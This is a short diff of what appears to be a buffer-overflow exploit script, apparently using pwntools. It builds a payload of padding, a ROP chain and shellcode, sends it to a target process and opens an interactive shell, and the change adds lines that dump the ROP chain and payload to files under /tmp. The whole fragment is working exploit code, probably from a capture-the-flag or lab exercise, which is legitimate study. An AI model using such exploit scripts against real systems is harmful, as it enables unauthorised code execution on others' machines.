@@ -59,5 +59,8 @@ else:
 payload = 'A'*512 + 'B'*8 + rop
 payload += ((1024 - len(payload)) * 'B') + shellcode
 
+with open("/tmp/rop", "w") as f: f.write(rop)
+with open("/tmp/payload", "w") as f: f.write(payload)
+
 p.writeline(payload)
 p.interactive()
